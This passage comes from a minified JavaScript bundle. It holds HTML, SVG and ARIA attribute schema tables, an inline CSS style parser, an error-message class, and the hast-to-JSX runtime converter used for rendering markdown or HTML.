ls(n,r,e.space)}const nk=Ai({properties:{ariaActiveDescendant:null,ariaAtomic:ut,ariaAutoComplete:null,ariaBusy:ut,ariaChecked:ut,ariaColCount:ne,ariaColIndex:ne,ariaColSpan:ne,ariaControls:qe,ariaCurrent:null,ariaDescribedBy:qe,ariaDetails:null,ariaDisabled:ut,ariaDropEffect:qe,ariaErrorMessage:null,ariaExpanded:ut,ariaFlowTo:qe,ariaGrabbed:ut,ariaHasPopup:null,ariaHidden:ut,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:qe,ariaLevel:ne,ariaLive:null,ariaModal:ut,ariaMultiLine:ut,ariaMultiSelectable:ut,ariaOrientation:null,ariaOwns:qe,ariaPlaceholder:null,ariaPosInSet:ne,ariaPressed:ut,ariaReadOnly:ut,ariaRelevant:null,ariaRequired:ut,ariaRoleDescription:qe,ariaRowCount:ne,ariaRowIndex:ne,ariaRowSpan:ne,ariaSelected:ut,ariaSetSize:ne,ariaSort:null,ariaValueMax:ne,ariaValueMin:ne,ariaValueNow:ne,ariaValueText:null,role:null},transform(e,n){return n==="role"?n:"aria-"+n.slice(4).toLowerCase()}});function ak(e,n){return n in e?e[n]:n}function rk(e,n){return ak(e,n.toLowerCase())}const jM=Ai({attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:bi,acceptCharset:qe,accessKey:qe,action:null,allow:null,allowFullScreen:_e,allowPaymentRequest:_e,allowUserMedia:_e,alt:null,as:null,async:_e,autoCapitalize:null,autoComplete:qe,autoFocus:_e,autoPlay:_e,blocking:qe,capture:null,charSet:null,checked:_e,cite:null,className:qe,cols:ne,colSpan:null,content:null,contentEditable:ut,controls:_e,controlsList:qe,coords:ne|bi,crossOrigin:null,data:null,dateTime:null,decoding:null,default:_e,defer:_e,dir:null,dirName:null,disabled:_e,download:cf,draggable:ut,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:_e,formTarget:null,headers:qe,height:ne,hidden:cf,high:ne,href:null,hrefLang:null,htmlFor:qe,httpEquiv:qe,id:null,imageSizes:null,imageSrcSet:null,inert:_e,inputMode:null,integrity:null,is:null,isMap:_e,itemId:null,itemProp:qe,itemRef:qe,itemScope:_e,itemType:qe,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:_e,low:ne,manifest:null,max:null,maxLength:ne,media:null,method:null,min:null,minLength:ne,multiple:_e,muted:_e,name:null,nonce:null,noModule:_e,noValidate:_e,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:_e,optimum:ne,pattern:null,ping:qe,placeholder:null,playsInline:_e,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:_e,referrerPolicy:null,rel:qe,required:_e,reversed:_e,rows:ne,rowSpan:ne,sandbox:qe,scope:null,scoped:_e,seamless:_e,selected:_e,shadowRootClonable:_e,shadowRootDelegatesFocus:_e,shadowRootMode:null,shape:null,size:ne,sizes:null,slot:null,span:ne,spellCheck:ut,src:null,srcDoc:null,srcLang:null,srcSet:null,start:ne,step:null,style:null,tabIndex:ne,target:null,title:null,translate:null,type:null,typeMustMatch:_e,useMap:null,value:ut,width:ne,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:qe,axis:null,background:null,bgColor:null,border:ne,borderColor:null,bottomMargin:ne,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:_e,declare:_e,event:null,face:null,frame:null,frameBorder:null,hSpace:ne,leftMargin:ne,link:null,longDesc:null,lowSrc:null,marginHeight:ne,marginWidth:ne,noResize:_e,noHref:_e,noShade:_e,noWrap:_e,object:null,profile:null,prompt:null,rev:null,rightMargin:ne,rules:null,scheme:null,scrolling:ut,standby:null,summary:null,text:null,topMargin:ne,valueType:null,version:null,vAlign:null,vLink:null,vSpace:ne,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:_e,disableRemotePlayback:_e,prefix:null,property:null,results:ne,security:null,unselectable:null},space:"html",transform:rk}),$M=Ai({attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},properties:{about:an,accentHeight:ne,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:ne,amplitude:ne,arabicForm:null,ascent:ne,attributeName:null,attributeType:null,azimuth:ne,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:ne,by:null,calcMode:null,capHeight:ne,className:qe,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:ne,diffuseConstant:ne,direction:null,display:null,dur:null,divisor:ne,dominantBaseline:null,download:_e,dx:null,dy:null,edgeMode:null,editable:null,elevation:ne,enableBackground:null,end:null,event:null,exponent:ne,externalResourcesRequired:null,fill:null,fillOpacity:ne,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:bi,g2:bi,glyphName:bi,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:ne,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:ne,horizOriginX:ne,horizOriginY:ne,id:null,ideographic:ne,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:ne,k:ne,k1:ne,k2:ne,k3:ne,k4:ne,kernelMatrix:an,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:ne,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:ne,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:ne,overlineThickness:ne,paintOrder:null,panose1:null,path:null,pathLength:ne,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:qe,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:ne,pointsAtY:ne,pointsAtZ:ne,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:an,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:an,rev:an,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:an,requiredFeatures:an,requiredFonts:an,requiredFormats:an,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:ne,specularExponent:ne,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:ne,strikethroughThickness:ne,string:null,stroke:null,strokeDashArray:an,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:ne,strokeOpacity:ne,strokeWidth:null,style:null,surfaceScale:ne,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:an,tabIndex:ne,tableValues:null,target:null,targetX:ne,targetY:ne,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:an,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:ne,underlineThickness:ne,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:ne,values:null,vAlphabetic:ne,vMathematical:ne,vectorEffect:null,vHanging:ne,vIdeographic:ne,version:null,vertAdvY:ne,vertOriginX:ne,vertOriginY:ne,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:ne,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:"svg",transform:ak}),ik=Ai({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:"xlink",transform(e,n){return"xlink:"+n.slice(5).toLowerCase()}}),ok=Ai({attributes:{xmlnsxlink:"xmlns:xlink"},properties:{xmlnsXLink:null,xmlns:null},space:"xmlns",transform:rk}),sk=Ai({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:"xml",transform(e,n){return"xml:"+n.slice(3).toLowerCase()}}),HM={classId:"classID",dataType:"datatype",itemId:"itemID",strokeDashArray:"strokeDasharray",strokeDashOffset:"strokeDashoffset",strokeLineCap:"strokeLinecap",strokeLineJoin:"strokeLinejoin",strokeMiterLimit:"strokeMiterlimit",typeOf:"typeof",xLinkActuate:"xlinkActuate",xLinkArcRole:"xlinkArcrole",xLinkHref:"xlinkHref",xLinkRole:"xlinkRole",xLinkShow:"xlinkShow",xLinkTitle:"xlinkTitle",xLinkType:"xlinkType",xmlnsXLink:"xmlnsXlink"},VM=/[A-Z]/g,aw=/-[a-z]/g,qM=/^data[-\w.:]+$/i;function lk(e,n){const r=Zo(n);let i=n,s=Wt;if(r in e.normal)return e.property[e.normal[r]];if(r.length>4&&r.slice(0,4)==="data"&&qM.test(n)){if(n.charAt(4)==="-"){const u=n.slice(5).replace(aw,WM);i="data"+u.charAt(0).toUpperCase()+u.slice(1)}else{const u=n.slice(4);if(!aw.test(u)){let c=u.replace(VM,YM);c.charAt(0)!=="-"&&(c="-"+c),n="data"+c}}s=sg}return new s(i,n)}function YM(e){return"-"+e.toLowerCase()}function WM(e){return e.charAt(1).toUpperCase()}const uk=tk([nk,jM,ik,ok,sk],"html"),Su=tk([nk,$M,ik,ok,sk],"svg");function rw(e){const n=String(e||"").trim();return n?n.split(/[ \t\n\r\f]+/g):[]}function KM(e){return e.join(" ").trim()}var oi={},wp,iw;function XM(){if(iw)return wp;iw=1;var e=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,n=/\n/g,r=/^\s*/,i=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,s=/^:\s*/,u=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,c=/^[;\s]*/,d=/^\s+|\s+$/g,g=`
 `,f="/",h="*",b="",y="comment",S="declaration";function T(A,w){if(typeof A!="string")throw new TypeError("First argument must be a string");if(!A)return[];w=w||{};var O=1,N=1;function $(re){var J=re.match(n);J&&(O+=J.length);var U=re.lastIndexOf(g);N=~U?re.length-U:N+re.length}function G(){var re={line:O,column:N};return function(J){return J.position=new D(re),ae(),J}}function D(re){this.start=re,this.end={line:O,column:N},this.source=w.source}D.prototype.content=A;function V(re){var J=new Error(w.source+":"+O+":"+N+": "+re);if(J.reason=re,J.filename=w.source,J.line=O,J.column=N,J.source=A,!w.silent)throw J}function K(re){var J=re.exec(A);if(J){var U=J[0];return $(U),A=A.slice(U.length),J}}function ae(){K(r)}function ie(re){var J;for(re=re||[];J=ee();)J!==!1&&re.push(J);return re}function ee(){var re=G();if(!(f!=A.charAt(0)||h!=A.charAt(1))){for(var J=2;b!=A.charAt(J)&&(h!=A.charAt(J)||f!=A.charAt(J+1));)++J;if(J+=2,b===A.charAt(J-1))return V("End of comment missing");var U=A.slice(2,J-2);return N+=2,$(U),A=A.slice(J),N+=2,re({type:y,comment:U})}}function te(){var re=G(),J=K(i);if(J){if(ee(),!K(s))return V("property missing ':'");var U=K(u),Y=re({type:S,property:x(J[0].replace(e,b)),value:U?x(U[0].replace(e,b)):b});return K(c),Y}}function se(){var re=[];ie(re);for(var J;J=te();)J!==!1&&(re.push(J),ie(re));return re}return ae(),se()}function x(A){return A?A.replace(d,b):b}return wp=T,wp}var ow;function ZM(){if(ow)return oi;ow=1;var e=oi&&oi.__importDefault||function(i){return i&&i.__esModule?i:{default:i}};Object.defineProperty(oi,"__esModule",{value:!0}),oi.default=r;const n=e(XM());function r(i,s){let u=null;if(!i||typeof i!="string")return u;const c=(0,n.default)(i),d=typeof s=="function";return c.forEach(g=>{if(g.type!=="declaration")return;const{property:f,value:h}=g;d?s(f,h,g):h&&(u=u||{},u[f]=h)}),u}return oi}var Co={},sw;function QM(){if(sw)return Co;sw=1,Object.defineProperty(Co,"__esModule",{value:!0}),Co.camelCase=void 0;var e=/^--[a-zA-Z0-9_-]+$/,n=/-([a-z])/g,r=/^[^-]+$/,i=/^-(webkit|moz|ms|o|khtml)-/,s=/^-(ms)-/,u=function(f){return!f||r.test(f)||e.test(f)},c=function(f,h){return h.toUpperCase()},d=function(f,h){return"".concat(h,"-")},g=function(f,h){return h===void 0&&(h={}),u(f)?f:(f=f.toLowerCase(),h.reactCompat?f=f.replace(s,d):f=f.replace(i,d),f.replace(n,c))};return Co.camelCase=g,Co}var Io,lw;function JM(){if(lw)return Io;lw=1;var e=Io&&Io.__importDefault||function(s){return s&&s.__esModule?s:{default:s}},n=e(ZM()),r=QM();function i(s,u){var c={};return!s||typeof s!="string"||(0,n.default)(s,function(d,g){d&&g&&(c[(0,r.camelCase)(d,u)]=g)}),c}return i.default=i,Io=i,Io}var eF=JM();const tF=pu(eF),ck=dk("end"),lg=dk("start");function dk(e){return n;function n(r){const i=r&&r.position&&r.position[e]||{};if(typeof i.line=="number"&&i.line>0&&typeof i.column=="number"&&i.column>0)return{line:i.line,column:i.column,offset:typeof i.offset=="number"&&i.offset>-1?i.offset:void 0}}}function nF(e){const n=lg(e),r=ck(e);if(n&&r)return{start:n,end:r}}function Po(e){return!e||typeof e!="object"?"":"position"in e||"type"in e?uw(e.position):"start"in e||"end"in e?uw(e):"line"in e||"column"in e?pf(e):""}function pf(e){return cw(e&&e.line)+":"+cw(e&&e.column)}function uw(e){return pf(e&&e.start)+"-"+pf(e&&e.end)}function cw(e){return e&&typeof e=="number"?e:1}class kt extends Error{constructor(n,r,i){super(),typeof r=="string"&&(i=r,r=void 0);let s="",u={},c=!1;if(r&&("line"in r&&"column"in r?u={place:r}:"start"in r&&"end"in r?u={place:r}:"type"in r?u={ancestors:[r],place:r.position}:u={...r}),typeof n=="string"?s=n:!u.cause&&n&&(c=!0,s=n.message,u.cause=n),!u.ruleId&&!u.source&&typeof i=="string"){const g=i.indexOf(":");g===-1?u.ruleId=i:(u.source=i.slice(0,g),u.ruleId=i.slice(g+1))}if(!u.place&&u.ancestors&&u.ancestors){const g=u.ancestors[u.ancestors.length-1];g&&(u.place=g.position)}const d=u.place&&"start"in u.place?u.place.start:u.place;this.ancestors=u.ancestors||void 0,this.cause=u.cause||void 0,this.column=d?d.column:void 0,this.fatal=void 0,this.file="",this.message=s,this.line=d?d.line:void 0,this.name=Po(u.place)||"1:1",this.place=u.place||void 0,this.reason=this.message,this.ruleId=u.ruleId||void 0,this.source=u.source||void 0,this.stack=c&&u.cause&&typeof u.cause.stack=="string"?u.cause.stack:"",this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}}kt.prototype.file="";kt.prototype.name="";kt.prototype.reason="";kt.prototype.message="";kt.prototype.stack="";kt.prototype.column=void 0;kt.prototype.line=void 0;kt.prototype.ancestors=void 0;kt.prototype.cause=void 0;kt.prototype.fatal=void 0;kt.prototype.place=void 0;kt.prototype.ruleId=void 0;kt.prototype.source=void 0;const ug={}.hasOwnProperty,aF=new Map,rF=/[A-Z]/g,iF=new Set(["table","tbody","thead","tfoot","tr"]),oF=new Set(["td","th"]),pk="https://github.com/syntax-tree/hast-util-to-jsx-runtime";function sF(e,n){if(!n||n.Fragment===void 0)throw new TypeError("Expected `Fragment` in options");const r=n.filePath||void 0;let i;if(n.development){if(typeof n.jsxDEV!="function")throw new TypeError("Expected `jsxDEV` in options when `development: true`");i=mF(r,n.jsxDEV)}else{if(typeof n.jsx!="function")throw new TypeError("Expected `jsx` in production options");if(typeof n.jsxs!="function")throw new TypeError("Expected `jsxs` in production options");i=gF(r,n.jsx,n.jsxs)}const s={Fragment:n.Fragment,ancestors:[],components:n.components||{},create:i,elementAttributeNameCase:n.elementAttributeNameCase||"react",evaluater:n.createEvaluater?n.createEvaluater():void 0,filePath:r,ignoreInvalidStyle:n.ignoreInvalidStyle||!1,passKeys:n.passKeys!==!1,passNode:n.passNode||!1,schema:n.space==="svg"?Su:uk,stylePropertyNameCase:n.stylePropertyNameCase||"dom",tableCellAlignToStyle:n.tableCellAlignToStyle!==!1},u=fk(s,e,void 0);return u&&typeof u!="string"?u:s.create(e,s.Fragment,{children:u||void 0},void 0)}function fk(e,n,r){if(n.type==="element")return lF(e,n,r);if(n.type==="mdxFlowExpression"||n.type==="mdxTextExpression")return uF(e,n);if(n.type==="mdxJsxFlowElement"||n.type==="mdxJsxTextElement")return dF(e,n,r);if(n.type==="mdxjsEsm")return cF(e,n);if(n.type==="root")return pF(e,n,r);if(n.type==="text")return fF(e,n)}function lF(e,n,r){const i=e.schema;let s=i;n.tagName.toLowerCase()==="svg"&&i.space==="html"&&(s=Su,e.schema=s),e.ancestors.push(n);const u=mk(e,n.tagName,!1),c=hF(e,n);let d=dg(e,n);return iF.has(n.tagName)&&(d=d.filter(function(g){return typeof g=="string"?!PM(g):!0})),gk(e,c,u,n),cg(c,d),e.ancestors.pop(),e.schema=i,e.create(n,u,c,r)}function uF(e,n){if(n.data&&n.data.estree&&e.evaluater){const i=n.data.estree.body[0];return i.type,e.evaluater.evaluateExpression(i.expression)}Qo(e,n.position)}function cF(e,n){if(n.data&&n.data.estree&&e.evaluater)return e.evaluater.evaluateProgram(n.data.estree);Qo(e,n.position)}function dF(e,n,r){const i=e.schema;let s=i;n.name==="svg"&&i.space==="html"&&(s=Su,e.schema=s),e.ancestors.push(n);const u=n.name===null?e.Fragment:mk(e,n.name,!0),c=bF(e,n),d=dg(e,n);return gk(e,c,u,n),cg(c,d),e.ancestors.pop(),e.schema=i,e.create(n,u,c,r)}function pF(e,n,r){const i={};return cg(i,dg(e,n)),e.create(n,e.Fragment,i,r)}function fF(e,n){return n.value}function gk(e,n,r,i){typeof r!="string"&&r!==e.Fragment&&e.passNode&&(n.node=i)}function cg(e,n){if(n.length>0){const r=n.length>1?n:n[0];r&&(e.children=r)}}function gF(e,n,r){return i;function i(s,u,c,d){const f=Array.isArray(c.children)?r:n;return d?f(u,c,d):f(u,c)}}function mF(e,n){return r;function r(i,s,u,c){const d=Array.isArray(u.children),g=lg(i);return n(s,u,c,d,{columnNumber:g?g.column-1:void 0,fileName:e,lineNumber:g?g.line:void 0},void 0)}}function hF(e,n){const r={};let i,s;for(s in n.properties)if(s!=="children"&&ug.call(n.properties,s)){const u=yF(e,s,n.properties[s]);if(u){const[c,d]=u;e.tableCellAlignToStyle&&c==="align"&&typeof d=="string"&&oF.has(n.tagName)?i=d:r[c]=d}}if(i){const u=r.style||(r.style={});u[e.stylePropertyNameCase==="css"?"text-align":"textAlign"]=i}return r}function bF(e,n){const r={};for(const i of n.attributes)if(i.type==="mdxJsxExpressionAttribute")if(i.data&&i.data.estree&&e.evaluater){const u=i.data.estree.body[0];u.type;const c=u.expression;c.type;const d=c.properties[0];d.type,Object.assign(r,e.evaluater.evaluateExpression(d.argument))}else Qo(e,n.position);else{const s=i.name;let u;if(i.value&&typeof i.value=="object")if(i.value.data&&i.value.data.estree&&e.evaluater){const d=i.value.data.estree.body[0];d.type,u=e.evaluater.evaluateExpression(d.expression)}else Qo(e,n.position);else u=i.value===null?!0:i.value;r[s]=u}return r}function dg(e,n){const r=[];let i=-1;const s=e.passKeys?new Map:aF;for(;++i<n.children.length;){const u=n.children[i];let c;if(e.passKeys){const g=u.type==="element"?u.tagName:u.type==="mdxJsxFlowElement"||u.type==="mdxJsxTextElement"?u.name:void 0;if(g){const f=s.get(g)||0;c=g+"-"+f,s.set(g,f+1)}}const d=fk(e,u,c);d!==void 0&&r.push(d)}return r}function yF(e,n,r){const i=lk(e.schema,n);if(!(r==null||typeof r=="number"&&Number.isNaN(r))){if(Array.isArray(r)&&(r=i.commaSeparated?MM(r):KM(r)),i.property==="style"){let s=typeof r=="object"?r:EF(e,String(r));return e.stylePropertyNameCase==="css"&&(s=SF(s)),["style",s]}return[e.elementAttributeNameCase==="react"&&i.space?HM[i.property]||i.property:i.attribute,r]}}function EF(e,n){try{return tF(n,{reactCompat:!0})}catch(r){if(e.ignoreInvalidStyle)return{};const i=r,s=new kt("Cannot parse `style` attribute",{ancestors:e.ancestors,cause:i,ruleId:"style",source:"hast-util-to-jsx-runtime"});throw s.file=e.filePath||void 0,s.url=pk+"#cannot-parse-style-attribute",s}}function mk(e,n,r){let i;if(!r)i={type:"Literal",value:n};else if(n.includes(".")){const s=n.split(".");let u=-1,c;for(;++u<s.length;){const d=ew(s[u])?{type:"Identifier",name:s[u]}:{type:"Literal",value:s[u]};c=c?{type:"MemberExpression",object:c,property:d,computed:!!(u&&d.type==="Literal"),optional:!1}:d}i=c}else i=ew(n)&&!/^[a-z]/.test(n)?{type:"Identifier",name:n}:{type:"Literal",value:n};if(i.type==="Literal"){const s=i.value;return ug.call(e.components,s)?e.components[s]:s}if(e.evaluater)return e.evaluater.evaluateExpression(i);Qo(e)}function Qo(e,n){const r=new kt("Cannot handle MDX estrees without `createEvaluater`",{ancestors:e.ancestors,place:n,ruleId:"mdx-estree",source:"hast-util-to-jsx-runtime"});throw r.file=e.filePath||void 0,r.url=pk+"#cannot-handle-mdx-estrees-without-createevaluater",r}function SF(e){const n={};let r;for(r in e)ug.call(e,r)&&(n[vF(r)]=e[r]);return n}function vF(e){let n=e.replace(rF,TF);return n.slice(0,3)==="ms-"&&(n="-"+n),n}function TF(e){return"-"+e.toLowerCase()}const Rp={action:["form"],cite:["blockquote","del","ins","q"],data:["object"],formAction:["button","input"],href:["a","area","base","link"],icon:["menuitem"],itemId:null,manifest:["html"],ping:["a","area"],poster:["video"],src:["audio","embed","iframe","img","input","script","source","track","video"]},_F={};function AF(e,n){const r=_F,i=typeof r.includeImageAlt=="boolean"?r.includeImageAlt:!0,s=typeof 